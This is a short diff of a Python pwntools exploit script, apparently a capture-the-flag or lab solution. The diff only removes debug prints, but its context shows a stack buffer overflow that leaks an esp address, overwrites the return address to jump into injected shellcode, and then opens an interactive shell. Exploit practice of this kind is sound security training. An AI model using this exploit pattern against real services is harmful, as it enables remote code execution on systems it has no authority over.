@@ -30,13 +30,10 @@ from pwn import *
   conn.send(payload)
   esp_add = conn.recv(20)
 
-  print esp_add
-
   esp_add = u32(esp_add[0:4])
-  print esp_add
+
   payload = 'A' * 20 + p32(esp_add + 20) + shellcode
   conn.send(payload)
-
 
   conn.interactive()
   conn.close()
